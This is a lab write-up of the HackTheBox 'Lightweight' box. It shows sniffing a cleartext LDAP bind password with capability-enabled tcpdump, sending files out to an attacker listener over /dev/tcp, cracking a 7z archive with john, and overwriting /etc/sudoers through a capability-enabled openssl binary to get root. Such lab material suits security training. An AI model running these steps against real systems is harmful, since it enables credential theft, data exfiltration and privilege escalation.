---
layout: post
title: "lightweight"
date: 2025-09-26 
categories: OSCP Playlist
---
# lightweight

# Summary

- linpeas to find tcpdump with capabilities set, which means we can capture traffic
- capture ldap traffic to find ldapuser2’s password when they are attempting bind authentication
- find backup.7z file, transfer file back to host and crack the 7z password with john
- extract files in 7z, to find password of ldapuser1
- linpeas to enumerate again to find all capabilities set for openssl binary in ldapuser1’s home dir
- GTFObin to exploit file read/write on openssl to get root

# Attack Path

First let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/lightweight 10.10.10.119

22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time
```

We get the domain name from the ssl-cert common name. Let’s add that to our /etc/hosts:

```bash
10.10.10.119 lightweight.htb
```

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/lightweight/image.png)

It seems we will be banned if we bruteforce, we cannot ffuf:

![image.png]({{ site.baseurl }}/assets/lightweight/image%201.png)

![image.png]({{ site.baseurl }}/assets/lightweight/image%202.png)

It seems we can ssh in with our IP as username and password:

```bash
ssh 10.10.16.7@10.10.10.119
```

We are in.

![image.png]({{ site.baseurl }}/assets/lightweight/image%203.png)

Nothing in our home dir. Let’s check what other users are on the box:

```bash
ls /home
```

![image.png]({{ site.baseurl }}/assets/lightweight/image%204.png)

We do not have sudo privileges.

Open ports:

```bash
ss -lntp 

State       Recv-Q Send-Q                               Local Address:Port                                              Peer Address:Port              
LISTEN      0      128                                              *:443                                                          *:*                  
LISTEN      0      128                                              *:389                                                          *:*                  
LISTEN      0      128                                              *:111                                                          *:*                  
LISTEN      0      128                                              *:80                                                           *:*                  
LISTEN      0      128                                              *:22                                                           *:*                  
LISTEN      0      128                                             :::389                                                         :::*                  
LISTEN      0      128                                             :::111                                                         :::*                  
LISTEN      0      128                                             :::22                                                          :::* 
```

No running processes. No additional network interface. No other user logged in.

Let’s attempt to login to other users; using their IP as the username as password.

```bash
ssh 10.10.14.2@lightweight.htb
```

Not much. Let’s move on to localhost:

```bash
ssh 127.0.0.1@lightweight.htb
```

Nope.

```bash
ssh ldapuser1@lightweight.htb
```

This failed. 

Let’s local port forward port 443:

```bash
ssh 10.10.16.7@lightweight.htb -L 443:localhost:443
```

Visiting https:

![image.png]({{ site.baseurl }}/assets/lightweight/image%205.png)

It’s the same exact web page.

Let’s use upload and execute linpeas:

```bash
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```

![image.png]({{ site.baseurl }}/assets/lightweight/image%206.png)

- Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.

Normally tcpdump can only be used by a privileged user, since we have the capabilities, we can also use it. Let’s start capturing traffic on our network interface, focus on ldap; many LDAP deployments accept unencrypted simple binds (username + password sent in cleartext) or carry queries and responses in plain text.

```bash
tcpdump -i lo port 389 -w capture.cap -v
```

Now while we wait, we can just navigate back to the site and play around, and click on other tabs to maybe force a reaction (waited a long time for packets, nothing got captured until we started interacting with the website again)

Let’s transfer the file back using scp:

```bash
scp 10.10.16.7@10.10.10.119:~/capture.pcap .
```

Now open the file in wireshark. If we go on the bind request packet, and expand the authentication tab, it will reveal the password of user ldapuser2:

![image.png]({{ site.baseurl }}/assets/lightweight/image%207.png)

![image.png]({{ site.baseurl }}/assets/lightweight/image%208.png)

```bash
ldapuser2:8bc8251332abe1d7f105d3e53ad39ac2
```

Another quick way to find the password is just use strings on the file:

```bash
strings catpure.pcap

SB50Y
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac2
SB50
SB=0
```

Another way to get pcap capture straight to host whilst live updating wireshark is:

```bash
ssh 10.10.16.7@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22'" | wireshark -k -i -
```

Anysway, let’s move on and log in as ldapuser2:

```bash
ssh ldapuser2@10.10.10.119
```

We cannot ssh in. Let’s just su from our current terminal:

```bash
su ldapuser2
```

We are in:

![image.png]({{ site.baseurl }}/assets/lightweight/image%209.png)

We see a backup.7z owned by root. We cannot transfer it back either as ldapuser2 does not have ssh access. The target also do not have nc. Let’s try this:

```bash
#on attack host
nc -lnvp 1234 > backup.7z

#on target 
cat backup.7z > /dev/tcp/10.10.16.7/1234

```

We now have the file on our host. Let’s extract it:

```bash
7z e backup.7z #we try ldapuser2 password
```

Did not work. Let’s try to crack it with john. First we have to turn it into john format:

```bash
7z2john backup.7z > backup.hash

john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash

delete           (backup.7z)
```

now let’s extract. Looking through the config files, we find status.php contain ldapuser1’s password

```bash
$username = 'ldapuser1';                                                                                                                                 
$password = 'f3ca9d298a553da117442deeb6fa932d'; 
```

Let’s see if this works; we are in.

We are not part of any privileged groups or have sudo privileges. Checking all files in the home dir, we find a pcap file. Let’s transfer that back and view it in wireshark:

```bash
#on attack host
nc -lnvp 1234 > capture2.pcap

#on target 
cat capture.pcap > /dev/tcp/10.10.16.7/1234

```

Not much. Let’s enumerate again with linpeas:

![image.png]({{ site.baseurl }}/assets/lightweight/image%2010.png)

We see that openssl has just ep, this mean it have all capabilities. Now go on GTFO bin and we can file read as root.

```bash
LFILE=/root/root.txt
./openssl enc -in "$LFILE"
```

We can now read files anywhere on the file system. It is important to note that the openssl that has all capabilities is the one in ldapuser1’s home dir, as the one in path /bin/openssl has none, therefore, it’s important to use ./

Here we can also have write permission, we can add our user as part of the sudoer:

```bash
./openssl enc -in /etc/sudoers > sudoers
```

Now edit the following line:

```bash
## Allow root to run any commands anywhere
root    ALL=(ALL)       ALL
ldapuser1    ALL=(ALL)       ALL
```

Now write this file back to sudoers:

```bash
cat sudoers | ./openssl enc -out "/etc/sudoers"
```

Now let’s see if we can switch to root:

```bash
sudo su -
```

We are now root.

![image.png]({{ site.baseurl }}/assets/lightweight/image%2011.png)